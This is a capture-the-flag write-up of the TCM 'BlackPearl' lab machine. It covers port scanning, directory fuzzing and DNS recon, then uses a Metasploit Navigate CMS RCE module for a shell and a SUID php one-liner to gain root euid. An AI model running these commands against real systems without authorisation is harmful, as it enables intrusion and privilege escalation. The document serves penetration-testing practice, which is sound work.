# BlackPearl machine by TCM

IP={target_IP}

Nmap scan:

nmap -sC -sV -p- {target_IP} -oN scan.initial

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

ffuf -u http://{target_IP}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   

`/secret` 

```jsx
OMG you got r00t !

Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 

```

In the page view-source we also found:\
`<!-- Webmaster: alek@blackpearl.tcm -->`

Lets make a recon of this dns:

dnsrecon -r 127.0.0.1/24 -n {target_IP} -d recon

```jsx
[+] 	 PTR blackpearl.tcm 127.0.0.1
```

lets add  this record to `/etc/hosts`

`{target_IP} blackpearl.tcm`

---

`gobuster dir -u http://blackpearl.tcm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,conf,txt -t 6`   

/.html                (Status: 403) [Size: 169]\
/index.php            (Status: 200) [Size: 86777]\
/navigate             (Status: 301) [Size: 185] [--> http://blackpearl.tcm/navigate/]

/navigate redirect us to login page

---

By exploring we found the exploit for cms 2. 8

https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/

`exploit/multi/http/navigate_cms_rce`

set Rhosts, Vhost, and run `exploit` and we have a shell.

---

We found the user 

`alek:x:1000:1000:alek,,,:/home/alek:/bin/bash`

by download a [linpeas.sh](http://linpeas.sh) and run it we found that its vulnerable to SUID for php:

so we need to find it in https://gtfobins.github.io/gtfobins/php/#suid

after execute it :

```jsx
www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

we got root euid:

uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

## Congrats!